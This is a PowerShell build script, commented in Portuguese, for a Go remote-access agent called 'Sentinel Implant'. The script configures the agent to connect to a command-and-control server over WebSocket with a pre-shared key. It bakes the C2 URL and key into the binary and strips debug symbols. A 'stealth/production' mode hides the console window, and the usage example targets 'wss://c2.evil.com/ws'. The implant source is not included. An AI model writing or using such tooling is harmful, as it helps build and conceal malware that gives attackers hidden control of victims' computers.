<#
.SYNOPSIS
    Script de build automatizado para o Sentinel Implant (Windows/PowerShell).

.DESCRIPTION
    Compila o agente Sentinel com injeção de configurações via LDFLAGS.
    Suporta builds de desenvolvimento e produção (GUI/Console).

.PARAMETER Server
    URL do servidor C2 (WebSocket).
    Padrão: "ws://localhost:8080/ws-sentinel"

.PARAMETER Key
    Chave secreta (PSK) para autenticação.
    Padrão: "SENTINEL_PROJECT_V1_SECRET_KEY"

.PARAMETER Output
    Nome do executável de saída.
    Padrão: "sentinel-implant.exe"

.PARAMETER Gui
    Se especificado, compila sem janela de console (modo stealth/produção).

.EXAMPLE
    .\build.ps1
    Build básico com valores padrão.

.EXAMPLE
    .\build.ps1 -Server "wss://c2.evil.com/ws" -Key "MyKey" -Gui
    Build de produção sem console.
#>

param (
    [string]$Server = "ws://localhost:8080/ws-sentinel",
    [string]$Key = "SENTINEL_PROJECT_V1_SECRET_KEY",
    [string]$Output = "sentinel-implant.exe",
    [switch]$Gui
)

# Configuração de Cores para Output
$Green = "Green"
$Yellow = "Yellow"
$Red = "Red"

Write-Host "[*] Iniciando build do Sentinel Implant..." -ForegroundColor $Yellow

# Verifica se Go está instalado
if (-not (Get-Command "go" -ErrorAction SilentlyContinue)) {
    Write-Host "[!] Erro: Go não encontrado no PATH." -ForegroundColor $Red
    exit 1
}

# Define variáveis de ambiente para o build
$env:GOOS = "windows"
$env:GOARCH = "amd64"
$env:CGO_ENABLED = "0"

Write-Host "    Target: Windows x64"
Write-Host "    Server: $Server"
Write-Host "    Output: $Output"

# Constrói as flags de linker (LDFLAGS)
# -s: Remove symbol table
# -w: Remove DWARF debug info
# -X: Injeta variáveis em tempo de compilação
$LdFlags = "-s -w -X 'sentinel-implant/config.serverURL=$Server' -X 'sentinel-implant/config.psk=$Key'"

if ($Gui) {
    Write-Host "    Mode:   GUI (Hidden Console)" -ForegroundColor $Green
    # -H windowsgui: Esconde a janela do console
    $LdFlags += " -H windowsgui"
} else {
    Write-Host "    Mode:   Console (Debug)" -ForegroundColor $Yellow
}

try {
    # Executa o comando de build
    # Nota: A sintaxe de array @(...) ajuda o PowerShell a passar argumentos corretamente para executáveis externos
    go build -ldflags $LdFlags -o $Output .

    if ($LASTEXITCODE -eq 0) {
        Write-Host "`n[+] Build concluído com sucesso: $Output" -ForegroundColor $Green

        # Mostra tamanho do arquivo
        $Size = (Get-Item $Output).Length / 1KB
        Write-Host "    Tamanho: $('{0:N2}' -f $Size) KB"
    } else {
        throw "O comando 'go build' retornou erro."
    }
}
catch {
    Write-Host "`n[!] Falha no Build:" -ForegroundColor $Red
    Write-Host $_.Exception.Message
    exit 1
}